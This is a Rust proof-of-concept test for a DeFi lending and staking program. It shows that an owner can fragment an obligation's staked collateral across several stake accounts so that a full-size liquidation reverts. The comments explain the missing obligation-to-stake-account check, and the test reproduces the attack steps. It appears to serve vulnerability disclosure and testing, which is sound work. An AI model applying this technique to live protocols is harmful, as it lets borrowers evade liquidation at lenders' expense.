//! PoC: an obligation's staked balance can be fragmented across several stake
//! accounts of the same owner, after which no single stake account can cover a
//! full-size liquidation of that obligation - and the liquidation CPI reverts.
//!
//! The lending program's `withdraw_from_staking_program` /
//! `deposit_to_staking_program` (token-lending/program/src/processor.rs) make
//! exactly one check on the stake account they are handed:
//!
//! ```text
//! let stake_account = StakeAccount::unpack(&stake_account_info.data.borrow())?;
//! if stake_account.owner != owner { return Err(InvalidStakeAccount) }
//! ```
//!
//! Nothing binds the stake account to the *obligation* whose collateral is
//! moving. So for an owner holding several obligations and several stake
//! accounts in the same pool, deposits and withdrawals can be attributed to any
//! of their stake accounts. Only the aggregate is conserved
//! (`pool_size == sum(stake_account.deposited_amount)`), never the per-obligation
//! attribution.
//!
//! `process_liquidate_obligation` then calls
//! `withdraw_from_staking_program(program_id, withdraw_amount, ..., obligation_owner)`
//! with the single stake account the liquidator supplies, and
//! `StakeAccount::withdraw` does `deposited_amount.checked_sub(amount)` - so a
//! `withdraw_amount` larger than that one account's balance aborts the whole
//! liquidation.
//!
//! This test models the state transitions of that sequence.

use port_finance_staking::error::StakingError;
use port_finance_staking::state::stake_account::StakeAccount;
use port_finance_staking::state::staking_pool::StakingPool;

const DURATION: u64 = 1_000_000;
const SUPPLY: u64 = 1_000_000;

/// Collateral the attacker parks in the obligation they will later default on.
const COLLATERAL: u64 = 1_000;

fn new_pool() -> StakingPool {
    let mut pool = StakingPool::default();
    pool.init(
        Default::default(),
        Default::default(),
        Default::default(),
        None,
        DURATION,
        SUPPLY,
        None,
        0,
        0,
    )
    .unwrap();
    pool
}

#[test]
fn fragmented_stake_accounts_block_full_size_liquidation() {
    let mut pool = new_pool();

    // The attacker's two stake accounts. Both have `owner == attacker`, which is
    // the only property the lending program checks, and both belong to this
    // pool, which is the only property the staking program checks.
    let mut stake_a = StakeAccount::default();
    let mut stake_b = StakeAccount::default();

    let mut slot = 10u64;

    // Obligation 1: deposit COLLATERAL, attributed to stake_a.
    let rate = pool.deposit(slot, COLLATERAL).unwrap();
    stake_a.deposit(rate, COLLATERAL).unwrap();

    // Obligation 2: deposit COLLATERAL, attributed to stake_b.
    slot += 1;
    let rate = pool.deposit(slot, COLLATERAL).unwrap();
    stake_b.deposit(rate, COLLATERAL).unwrap();

    assert_eq!(pool.pool_size, 2 * COLLATERAL);

    // Now unwind obligation 2 in two halves, attributing one half to stake_a and
    // the other to stake_b. Both withdrawals are legitimate as far as every
    // check in either program is concerned: same owner, same pool.
    slot += 1;
    let rate = pool.withdraw(slot, COLLATERAL / 2).unwrap();
    stake_a.withdraw(rate, COLLATERAL / 2).unwrap();

    slot += 1;
    let rate = pool.withdraw(slot, COLLATERAL / 2).unwrap();
    stake_b.withdraw(rate, COLLATERAL / 2).unwrap();

    // Obligation 1 still holds COLLATERAL of collateral, and the pool agrees.
    assert_eq!(pool.pool_size, COLLATERAL);
    assert_eq!(
        stake_a.deposited_amount + stake_b.deposited_amount,
        COLLATERAL,
        "the aggregate invariant still holds"
    );

    // But the balance is now split in half, and neither account alone covers the
    // obligation's collateral.
    assert_eq!(stake_a.deposited_amount, COLLATERAL / 2);
    assert_eq!(stake_b.deposited_amount, COLLATERAL / 2);

    // A liquidator seizing all of obligation 1's collateral calls
    // withdraw_from_staking_program(withdraw_amount = COLLATERAL) with one stake
    // account. Either choice aborts the liquidation.
    slot += 1;
    let expected: solana_program::program_error::ProgramError =
        StakingError::InvalidWithdrawAmountError.into();

    let rate = pool.withdraw(slot, COLLATERAL).unwrap();
    assert_eq!(
        stake_a.clone().withdraw(rate, COLLATERAL),
        Err(expected.clone()),
        "full-size liquidation reverts against stake_a"
    );
    assert_eq!(
        stake_b.clone().withdraw(rate, COLLATERAL),
        Err(expected),
        "full-size liquidation reverts against stake_b"
    );

    // Only a liquidation sized to one fragment goes through, so the position has
    // to be cleared in as many transactions as the owner made fragments.
    let mut stake_a_ok = stake_a.clone();
    assert!(stake_a_ok.withdraw(rate, COLLATERAL / 2).is_ok());
    assert_eq!(stake_a_ok.deposited_amount, 0);
}
